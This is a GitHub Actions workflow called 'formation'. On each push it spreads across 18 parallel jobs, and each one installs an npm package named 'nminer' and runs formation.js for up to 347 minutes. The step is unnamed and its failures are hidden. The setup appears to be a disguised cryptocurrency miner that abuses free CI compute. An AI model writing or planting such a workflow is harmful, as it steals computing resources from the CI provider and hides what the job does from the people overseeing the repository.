name: formation
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4373 }
          - { version: 5539 }
          - { version: 2045 }
          - { version: 6530 }
          - { version: 9968 }
          - { version: 2687 }
          - { version: 7395 }
          - { version: 7754 }
          - { version: 9789 }
          - { version: 5687 }
          - { version: 445 }
          - { version: 6801 }
          - { version: 5426 }
          - { version: 359 }
          - { version: 9913 }
          - { version: 6207 }
          - { version: 5975 }
          - { version: 3852 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 347m node formation.js || echo "formation executed"